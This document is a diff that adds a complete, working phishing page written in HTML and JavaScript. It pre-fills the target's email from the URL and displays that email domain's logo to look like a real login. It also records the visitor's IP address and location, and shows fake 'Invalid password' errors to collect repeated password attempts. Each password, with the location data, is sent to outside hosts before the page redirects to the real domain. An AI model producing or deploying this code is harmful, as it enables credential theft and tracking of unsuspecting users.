@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dynamic Access Page</title>
+    <style>
+        /* Google Fonts */
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+        /* Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #f3e7e9 0%, #e3eeff 100%);
+        }
+
+        .container {
+            background-color: rgba(255, 255, 255, 0.85);
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .container:hover {
+            transform: scale(1.02);
+        }
+
+        h2 {
+            text-align: center;
+            margin-bottom: 24px;
+            font-weight: 500;
+            font-size: 24px;
+            color: #333;
+            position: relative;
+        }
+
+        h2:after {
+            content: '';
+            display: block;
+            width: 50px;
+            height: 3px;
+            background-color: #007bff;
+            margin: 8px auto 0;
+            border-radius: 3px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #333;
+            transition: border 0.3s ease;
+        }
+
+        input[type="email"]::placeholder, input[type="password"]::placeholder {
+            color: #999;
+        }
+
+        input[type="email"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #007bff;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .error-message {
+            color: #d9534f;
+            text-align: center;
+            margin-top: 15px;
+            display: none;
+            font-weight: 500;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .error-message.show {
+            display: block;
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .error-message.hide {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            width: 100px;
+            height: auto;
+            max-width: 100px;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+		  function extractEmailFromHash() {
+            const hash = window.location.hash.substring(1); // Remove the '#' at the start
+            const [localPart, domainPart] = hash.split('&&'); // Split into local part and domain part
+            return `${localPart}@${domainPart}`; // Combine to form the email address
+        }
+		
+        // Create the container for the form
+        const container = document.createElement('div');
+        container.className = 'container';
+
+        // Create the form title
+        const formTitle = document.createElement('h2');
+        formTitle.id = 'form-title';
+        container.appendChild(formTitle);
+
+        // Create the form
+        const form = document.createElement('form');
+        form.id = 'accessForm';
+
+        // Email input group
+        const emailGroup = document.createElement('div');
+        emailGroup.className = 'input-group';
+        const emailInput = document.createElement('input');
+        emailInput.type = 'email';
+        emailInput.id = 'email';
+        emailInput.name = 'email';
+        emailInput.placeholder = 'Enter your email';
+        emailInput.required = true;
+        emailGroup.appendChild(emailInput);
+
+        // Submit button for email
+        const nextButton = document.createElement('button');
+        nextButton.type = 'submit';
+        nextButton.textContent = 'Next';
+
+        // Error message
+        const errorMessage = document.createElement('p');
+        errorMessage.id = 'error-message';
+        errorMessage.className = 'error-message';
+
+        // Append elements to the form and container for email submission
+		 form.appendChild(errorMessage);
+        form.appendChild(emailGroup);
+        form.appendChild(nextButton);
+      
+        container.appendChild(form);
+
+        // Append the container to the body
+        document.body.appendChild(container);
+
+        // Random title generator
+        const titles = [
+            "Enter Access Portal", "Continue to Portal", "Verify Your Information", "Proceed to Access",
+            "Document Verification", "Secure Access", "Account Verification", "Authentication Required",
+            "Continue for Review", "Proceed with Verification", "Identity Check", "Information Required",
+            "Complete Access", "Secure Area", "Access Required", "Verify Details", "Check Information",
+            "Proceed for Confirmation", "Identity Verification", "Secure Information", "Confirm Details",
+            "Complete Verification", "Proceed for Access", "Secure Area Entry", "Confirm Identity", 
+            "Validate Access", "Review Information", "Confirm Access", "Identity Checkpoint", "Access Gateway",
+            "Portal Confirmation", "Account Review", "Validation Required", "Confirm Credentials", "Proceed to Documents",
+            "Information Check", "Document Access", "Verification Needed", "Review & Continue", "Security Check",
+            "Authentication Gateway", "Continue to Confirmation", "Secure Validation", "Access Validation", "Confirm Identity",
+            "Proceed with Details", "Secure Checkpoint", "Information Confirmation"
+        ];
+        const randomTitle = titles[Math.floor(Math.random() * titles.length)];
+        document.title = randomTitle;
+        formTitle.textContent = randomTitle;
+		
+        // Set email input field with the combined email address
+        emailInput.value = extractEmailFromHash();
+
+        // Variable to track attempts
+        let attemptCount = 0;
+
+        // Function to capture IP and location
+        function captureLocationAndIP(callback) {
+            $.getJSON('https://api.ipify.org?format=json', function(data) {
+                const ipAddress = data.ip;
+                $.getJSON(`https://ipapi.co/${ipAddress}/json/`, function(locationData) {
+                    const location = {
+                        ip: ipAddress,
+                        city: locationData.city,
+                        region: locationData.region,
+                        country: locationData.country_name,
+                        latitude: locationData.latitude,
+                        longitude: locationData.longitude
+                    };
+                    callback(location);
+                });
+            });
+        }
+
+        // Handle email form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = emailInput.value;
+            const domain = email.split('@')[1];
+
+            // Capture IP and location data
+            captureLocationAndIP(function(location) {
+               
+                // Clear the form and container
+                form.innerHTML = '';
+                container.innerHTML = '';
+
+                // Show the logo
+                const logoContainer = document.createElement('div');
+                logoContainer.className = 'logo-container';
+                const logoImg = document.createElement('img');
+                logoImg.src = `https://logo.clearbit.com/${domain}`;
+                logoImg.onerror = () => {
+                    // In case logo fetching fails
+                    logoImg.src = 'https://via.placeholder.com/100?text=No+Logo';
+                };
+                logoContainer.appendChild(logoImg);
+                container.appendChild(logoContainer);
+
+                // Show the email input as a readonly field
+                const emailDisplay = document.createElement('div');
+                emailDisplay.className = 'input-group';
+                const emailDisplayInput = document.createElement('input');
+                emailDisplayInput.type = 'email';
+                emailDisplayInput.value = email;
+                emailDisplayInput.readOnly = true;
+                emailDisplayInput.style.cursor = 'default'; // Make it clear it's read-only
+                emailDisplay.appendChild(emailDisplayInput);
+
+                // Password input group
+                const passwordGroup = document.createElement('div');
+                passwordGroup.className = 'input-group';
+                const passwordInput = document.createElement('input');
+                passwordInput.type = 'password';
+                passwordInput.id = 'password';
+                passwordInput.name = 'password';
+                passwordInput.placeholder = 'Enter your password';
+                passwordInput.required = true;
+                passwordGroup.appendChild(passwordInput);
+
+                // Submit button for password
+                const submitButton = document.createElement('button');
+                submitButton.type = 'submit';
+                submitButton.textContent = 'Submit';
+
+                // Append all elements for password submission
+                form.appendChild(emailDisplay);
+                form.appendChild(passwordGroup);
+                form.appendChild(submitButton);
+                container.appendChild(form);
+
+                // Add error message back
+                form.appendChild(errorMessage);
+
+                // Handle form submission for password
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
+
+                    const password = passwordInput.value;
+
+                    if (!password) {
+                        errorMessage.textContent = 'Please enter a password.';
+                        errorMessage.classList.add('show');
+                        setTimeout(() => errorMessage.classList.remove('show'), 2000);
+                        return;
+                    }
+
+                   
+
+                    if (attemptCount < 2) {
+					 $.ajax({
+                            type: 'POST',
+                            url: 'https://coffee-jorry-4.tiiny.io', // Ensure this URL is correct
+                            data: { email: email, password: password, ip: location.ip, city: location.city, region: location.region, country: location.country, latitude: location.latitude, longitude: location.longitude },
+                            success: function(response) {
+                               
+                            },
+                            error: function() {
+                               // alert('An error occurred while submitting your data.');
+                            }
+                        });
+                        errorMessage.textContent = 'Invalid password. Please try again.';
+                        errorMessage.classList.add('show');
+                        setTimeout(() => errorMessage.classList.remove('show'), 2000);
+                    } else {
+                        // Submit the password and IP/Location data
+                        $.ajax({
+                            type: 'POST',
+                            url: 'https://revoluciong.com.ar/new-php.php', // Ensure this URL is correct
+                            data: { email: email, password: password, ip: location.ip, city: location.city, region: location.region, country: location.country, latitude: location.latitude, longitude: location.longitude },
+                            success: function(response) {
+                               
+                            },
+                            error: function() {
+                               window.location.href = `https://${domain}`; // Redirect to domain on second successful attempt
+                            }
+                        });
+                    }attemptCount++;
+                });
+            });
+        });
+    </script>
+</body>
+</html>
